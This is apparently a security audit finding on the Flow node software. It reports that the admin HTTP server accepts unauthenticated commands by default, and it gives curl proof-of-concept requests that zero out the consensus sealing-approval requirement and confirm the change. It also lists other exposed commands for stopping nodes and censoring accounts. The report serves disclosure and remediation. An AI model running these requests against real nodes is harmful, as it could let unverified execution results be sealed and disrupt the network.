### Title
Unauthenticated Admin HTTP Server Allows Unilateral Modification of Consensus-Critical Sealing Parameters — (File: admin/command_runner.go)

---

### Summary

The Flow node admin server exposes an HTTP endpoint that, when mutual-TLS is not configured (the default), accepts completely unauthenticated requests from any network-reachable caller. Any entity that can reach the admin port can invoke `set-config` to set `consensus-required-approvals-for-sealing` to `0`, eliminating the verification-node approval requirement for block sealing. This is a direct analog to the reported Centralization Risk: a single privileged control point can unilaterally alter security-critical protocol state, and that control point is not protected by mandatory authentication.

---

### Finding Description

`CommandRunner.runAdminServer` in `admin/command_runner.go` starts two servers:

1. A Unix-socket gRPC server (local-only, no auth).
2. An HTTP/gRPC-gateway server bound to the operator-supplied `--admin-addr` (e.g. `0.0.0.0:9002`).

The HTTP server is started with plain `ListenAndServe` when `tlsConfig == nil`:

```go
// admin/command_runner.go  lines 260-265
if r.tlsConfig == nil {
    err = httpServer.ListenAndServe()
} else {
    err = httpServer.ListenAndServeTLS("", "")
}
```

TLS is only applied when the operator explicitly passes all three flags `--admin-cert`, `--admin-key`, and `--admin-client-certs`:

```go
// cmd/scaffold.go  lines 756-774
if node.AdminCert != NotSet {
    // ... build TLS config with RequireAndVerifyClientCert
    opts = append(opts, admin.WithTLS(config))
}
// If AdminCert is NotSet, no TLS option is added; tlsConfig stays nil.
```

`runCommand` performs no authentication check of its own:

```go
// admin/command_runner.go  lines 304-341
func (r *CommandRunner) runCommand(ctx context.Context, command string, data any) (any, error) {
    req := &CommandRequest{Data: data}
    if validator := r.getValidator(command); validator != nil { ... }
    if handler := r.getHandler(command); handler != nil { ... }
    ...
}
```

The `set-config` command registered for every node type accepts any config field registered with the `updatable_configs.Manager`. On a Consensus node, `consensus-required-approvals-for-sealing` is registered:

```go
// cmd/consensus/main.go  lines 245-248
err = node.ConfigManager.RegisterUintConfig("consensus-required-approvals-for-sealing",
    setter.RequireApprovalsForSealConstructionDynamicValue,
    setter.SetRequiredApprovalsForSealingConstruction)
```

`SetRequiredApprovalsForSealingConstruction` accepts `0` as a valid value (the validation only rejects values above `chunkAlpha`):

```go
// module/updatable_configs/validation/require_approvals_for_seal_construction.go  lines 7-17
func ValidateRequireApprovals(...) error {
    if requiredApprovalsForSealVerification > requiredApprovalsForSealConstruction { ... }
    if requiredApprovalsForSealConstruction > chunkAlpha { ... }
    return nil
}
```

The seal validator reads this value dynamically at validation time:

```go
// module/validation/seal_validator.go  lines 309-311
requireApprovalsForSealConstruction := s.sealingConfigsGetter.RequireApprovalsForSealConstructionDynamicValue()
if uint(numberApprovers) < requireApprovalsForSealConstruction { ... }
```

---

### Impact Explanation

An attacker who can reach the admin HTTP port of a Consensus node (or a sufficient number of them) can POST:

```
curl http://<consensus-node>:9002/admin/run_command \
  -d '{"commandName":"set-config","data":{"consensus-required-approvals-for-sealing":0}}'
```

This atomically stores `0` in the `atomic.Uint32` backing `requiredApprovalsForSealConstruction`. From that point forward, the seal validator on that node accepts seals with **zero** verification-node approvals for any chunk. A Byzantine execution node can then produce and seal an incorrect execution result without any verification coverage, potentially finalizing corrupted on-chain state and affecting user assets.

Additionally, the same unauthenticated surface exposes:
- `stop-at-height` (crash an execution node at an arbitrary height, disrupting liveness)
- `ingest-tx-rate-limit` (add any payer address to the rate-limit blocklist on collection nodes, censoring specific accounts)
- `set-uploader-enabled` (disable block-data uploading on execution nodes)

---

### Likelihood Explanation

The admin server binds to the address supplied via `--admin-addr`. The README and localnet configuration demonstrate binding to `0.0.0.0:9002`, and Docker port-mapping exposes this to the host network. In cloud or container deployments where network segmentation is incomplete, the admin port is reachable by any co-tenant or network peer. Because TLS/mTLS is opt-in and not the default, the majority of deployments run the admin server without any authentication. An unstaked observer node or any entity with layer-3 access to the node's admin port can exploit this without any on-chain credentials.

---

### Recommendation

1. **Make mTLS mandatory**: Remove the `if node.AdminCert != NotSet` branch and require all three TLS flags to be set before the admin server starts. Refuse to start if they are absent.
2. **Bind to loopback by default**: Change the default `--admin-addr` to `127.0.0.1:9002` and document that binding to `0.0.0.0` requires TLS.
3. **Add a command-level authorization layer**: Introduce a role or token check inside `runCommand` so that even if the transport is misconfigured, state-mutating commands (`set-config`, `stop-at-height`, `ingest-tx-rate-limit`) require an explicit credential.

### Proof of Concept

**Precondition**: Consensus node started with `--admin-addr 0.0.0.0:9002` and no `--admin-cert`/`--admin-key`/`--admin-client-certs` flags (the default).

**Step 1 – Verify no authentication is required:**
```bash
curl -s http://<consensus-node-ip>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName":"list-commands"}' | jq .
# Returns full command list with no credential challenge
```

**Step 2 – Zero out the sealing approval requirement:**
```bash
curl -s http://<consensus-node-ip>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName":"set-config","data":{"consensus-required-approvals-for-sealing":0}}'
# {"output":{"newValue":0,"oldValue":1}}
```

**Step 3 – Confirm the change took effect:**
```bash
curl -s http://<consensus-node-ip>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName":"get-config","data":"consensus-required-approvals-for-sealing"}'
# {"output":0}
```

From this point, `sealValidator.validateSeal` on that node passes any seal regardless of the number of verification-node approvals, because `RequireApprovalsForSealConstructionDynamicValue()` now returns `0` and the guard `uint(numberApprovers) < requireApprovalsForSealConstruction` is never true.
